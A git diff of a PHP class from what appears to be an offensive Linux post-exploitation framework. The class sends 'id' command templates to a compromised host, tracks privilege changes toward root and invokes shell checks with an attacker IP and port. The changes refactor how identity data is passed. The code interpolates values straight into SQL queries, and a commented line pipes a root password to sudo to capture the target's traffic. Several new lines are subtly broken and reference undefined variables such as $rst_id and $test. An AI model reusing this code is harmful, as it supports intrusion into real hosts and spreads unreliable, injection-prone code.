@@ -9,6 +9,8 @@ class lan4linux extends LAN{
     var $template_shell ;
     var $templateB64_shell ;
     
+    var $id ;
+    var $id8b64 ;
     var $uid ;
     var $uid_name;
     var $gid;
@@ -41,9 +43,14 @@ class lan4linux extends LAN{
      https://github.com/initstring/uptux
      */
 
-    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context) {
+    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {
         parent::__construct($eth,$domain,$ip,$port,$protocol,$stream);
-
+        //$uid,$uid_name,$gid,$gid_name,$context
+        $rst_id = base64_decode($id8b64);
+        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
+        
+        $this->id = $id;
+        $this->id8b64 = trim($id8b64);
         $this->uid = trim($uid);
         $this->uid_name = trim($uid_name);
         $this->gid = trim($gid);
@@ -57,7 +64,7 @@ class lan4linux extends LAN{
         $this->context = trim($context);
         
       
-        $this->lan2where = "id8port = '$this->port2id' AND uid_name = '$this->uid_name' AND templateB64_id = '$this->templateB64_id' AND templateB64_cmd = '$this->templateB64_cmd' AND uid = '$uid' AND gid = '$gid' AND gid_name = '$gid_name' AND context = '$context' ";
+        $this->lan2where = "id8port = '$this->port2id' AND uid_name = '$this->uid_name' AND templateB64_id = '$this->templateB64_id' AND templateB64_cmd = '$this->templateB64_cmd' AND uid = '$this->uid' AND gid = '$this->gid' AND gid_name = '$this->gid_name' AND context = '$this->context' AND id8b64 = '$this->id8b64' ";
         
         
         if (empty($this->uid_name)) {$this->log2error("Empty USERNAME",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","LAN");exit();}
@@ -65,7 +72,7 @@ class lan4linux extends LAN{
         if ($this->context !== "listening_Server" ){
             $sql_r = "SELECT templateB64_id FROM LAN WHERE $this->lan2where ORDER BY ladate DESC LIMIT 1 ";           
         if (!$this->checkBD($sql_r)) {
-            $sql_w = "INSERT INTO LAN (id8port,uid_name,templateB64_id,templateB64_cmd,templateB64_shell,uid,gid,gid_name,context) VALUES ('$this->port2id','$this->uid_name','$this->templateB64_id','$this->templateB64_cmd','$this->templateB64_shell','$this->uid','$this->gid','$this->gid_name','$this->context'); ";
+            $sql_w = "INSERT INTO LAN (id8port,uid_name,templateB64_id,templateB64_cmd,templateB64_shell,uid,gid,gid_name,context,id8b64) VALUES ('$this->port2id','$this->uid_name','$this->templateB64_id','$this->templateB64_cmd','$this->templateB64_shell','$this->uid','$this->gid','$this->gid_name','$this->context','$this->id8b64'); ";
             echo "$sql_w\n";
             $this->mysql_ressource->query($sql_w);
             //$this->cmd("localhost","echo '$this->root_passwd' | sudo -S tshark -i $this->eth_wlan  host $this->ip -w $this->dir_tmp/$this->ip.pcap");
@@ -252,8 +259,8 @@ This can also be used to determine local IPs, as well as gain a better understan
     public function lan2whoami(){
         $username_found = "";
         $rst = $this->lan2id();
-        list($uid_found,$username_found,$gid_found,$groupname_found) = $this->parse4id($rst);
-        return $username_found;
+        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
+        return $uid_name;
     }
     
     public function lan2id(){
@@ -359,9 +366,9 @@ This can also be used to determine local IPs, as well as gain a better understan
             $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
         }
         
-        list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context) = $this->parse4id($rst_id);
+        list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id) = $this->parse4id($rst_id);
         
-        
+        $id8b64 = base64_encode($id);
         if (!empty($uid_name) ){
             
             if ( (empty($euid_name)) && ($uid_name !== $this->uid_name) ){
@@ -383,7 +390,7 @@ This can also be used to determine local IPs, as well as gain a better understan
                 //fgets(STDIN);
                 $this->pause();
                 
-                $obj_lan_root1 = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
+                $obj_lan_root1 = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$id8b64);
                 $obj_lan_root1->poc($this->flag_poc);
                 $obj_lan_root1->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
                 
@@ -395,8 +402,8 @@ This can also be used to determine local IPs, as well as gain a better understan
                 
                 $cmd_id = str_replace("%ID%", $id, $template_id_new);
                 $rst_id = $this->lan2stream4result($cmd_id,$this->stream_timeout);
-                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context) = $this->parse4id($rst_id);
-               
+                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id) = $this->parse4id($rst_id);
+                $id8b64 = base64_encode($id);
                 
                 $template_id = $template_id_new;
                 $templateB64_id = base64_encode($template_id);
@@ -412,7 +419,7 @@ This can also be used to determine local IPs, as well as gain a better understan
                 //$this->article("NEW Template ID", $template_id);
                 $this->article("OLD Template CMD", $this->template_cmd);
                 //$this->article("NEW Template CMD", $template_cmd);
-                $obj_lan_root = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
+                $obj_lan_root = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$id8b64);
                 $obj_lan_root->poc($this->flag_poc);
                 $this->article("Template ID", $obj_lan_root->template_id);
                 //$this->article("Template BASE64 ID", $obj_lan_root->templateB64_id);
@@ -518,8 +525,9 @@ EOC;
             $data = str_replace("%ID%", "/tmp/seteuid_id_$this->uid_name", $template_id);
             $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
              
-            list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups) = $this->parse4id($rst_id);
-           
+            list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $test->parse4id($rst_id);
+            $id8b64 = base64_encode($id);
+            
             
             if ( !empty($username_found) ){
                 
@@ -566,7 +574,7 @@ EOC;
                     
                     $data = "$file_bash_name id";
                     $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
-                    list($new_uid_found,$new_username_found,$new_gid_found,$new_groupname_found,$new_euid,$new_username_euid,$new_egid,$new_groupname_egid,$new_groups) = $this->parse4id($rst_id);
+                    list($new_uid_found,$new_username_found,$new_gid_found,$new_groupname_found,$new_euid,$new_username_euid,$new_egid,$new_groupname_egid,$new_groups,$context,$id8b64) = $this->parse4id($rst_id);
                     
                     
                     if ( !empty($new_username_found) ){
